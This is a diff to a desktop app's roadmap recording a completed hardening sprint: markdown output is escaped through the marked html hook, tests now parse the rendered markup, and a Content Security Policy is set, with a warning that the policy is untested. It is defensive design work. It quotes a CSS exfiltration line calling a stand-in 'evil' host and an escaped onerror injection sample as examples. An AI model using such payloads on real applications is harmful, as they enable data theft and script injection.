@@ -201,8 +201,13 @@ responses). Dev-only diagnostics bridge added in c2442ff (`/__ab_log`,
 > review of 2026-07-26 (Opus 5) and the project response of 2026-07-27.
 > **FR-WIKI is deferred until H1–H3 close.**
 >
-> **H1 done** (link containment). **350 unit + 173 BDD green**, typecheck clean.
-> **Next: H2** (render safety — sanitize markdown, define CSP).
+> **H1 done** (link containment). **H2 done** (render safety).
+> **380 unit + 185 BDD green**, typecheck and vite build clean.
+> **Next: H3** (consolidation cost safety — per-depth state, backoff, in-flight
+> budget abort).
+>
+> ⚠️ The H2 CSP is not covered by any test. Verify with `npm run tauri dev` and a
+> production bundle before tagging v0.1.1.
 
 ### Sprint: Hardening (v0.1.1) — started 2026-07-27
 
@@ -272,14 +277,55 @@ absent from capabilities · no `openPath` import anywhere in `src/`
 **First by necessity, not by priority:** the suite is already red from this work.
 Nothing else can ship until it closes.
 
-#### Sprint H2 — Render safety `[S]`
+#### Sprint H2 — Render safety `[S]` — DONE (2026-07-27)
 
 Goal: nothing the LLM or a file can say becomes executable markup.
 
 | ID | Requirement | Status | Commit |
 |----|-------------|--------|--------|
-| NFR-SEC-10 | Markdown output sanitized before `{@html}` | todo | |
-| NFR-SEC-11 | CSP defined (`csp: null` prohibited) | todo | |
+| NFR-SEC-10 | Markdown output sanitized before `{@html}` | done | (this sprint) |
+| NFR-SEC-11 | CSP defined (`csp: null` prohibited) | done | (this sprint) |
+
+**Tests at H2 close:** 380 unit + 185 BDD green, typecheck and vite build clean.
+
+**No sanitizer dependency.** `marked` routes every raw-HTML construct — block
+*and* inline — through the single `html` renderer hook, verified empirically
+before implementing. Overriding that hook to escape is complete by construction,
+needs no DOM, works in the node test environment, and avoids pulling in
+DOMPurify + jsdom. Escaping rather than dropping keeps an injection attempt
+visible to the user (aligns with FR-NET-03's "surface the attempt").
+
+**Test method changed mid-sprint.** The first pass asserted on substrings and
+produced false failures: `&lt;img onerror="x"&gt;` contains the text `onerror`
+while forming no element at all. Substring assertions are the wrong instrument
+for a DOM property. `tests/support/rendered-markup.ts` now parses the output
+(via `linkedom`, already a dependency) and asserts the real invariant: no
+element the author chose, no `on*` attribute, no `javascript:`/`data:`/
+`vbscript:` URL.
+
+**CSP shipped:**
+`default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
+img-src 'self' data:; font-src 'self'; connect-src 'self' ipc: http://ipc.localhost;
+object-src 'none'; base-uri 'self'; frame-src 'none'; frame-ancestors 'none'`
+
+- `connect-src ipc: http://ipc.localhost` is required for Tauri IPC.
+- `script-src 'self'` needs no `unsafe-inline`: Tauri injects nonces/hashes for
+  bundled assets at compile time, and the built `index.html` has no inline
+  script and the bundle no `eval`/`new Function` (both checked).
+- `img-src 'self' data:` also blocks CSS-based exfiltration
+  (`background: url(https://evil/?leak=…)`) and remote tracking pixels in
+  rendered markdown. Side effect: remote images in fetched-and-saved markdown
+  will not display. Deliberate.
+- `style-src` keeps `'unsafe-inline'`. The app has no inline `style=` attributes
+  and no Svelte transitions, so `'self'` would probably work — but Tauri injects
+  its own styles, and the residual risk is now small because no
+  attacker-controlled markup reaches the DOM at all. Revisit if desired.
+
+> **⚠️ NOT VERIFIED BY TESTS — manual check required before release.** No test in
+> this repo loads the app under its CSP. A wrong `connect-src` kills IPC and the
+> app is dead on launch; nothing in the suite would catch it. Verify with
+> `npm run tauri dev` **and** a production bundle before tagging v0.1.1, and
+> watch the webview console for CSP violation reports.
 
 Touches: `markdown.ts` · `tauri.conf.json` · `package.json` (sanitizer dep) ·
 new `specs/features/markdown-safety.feature`
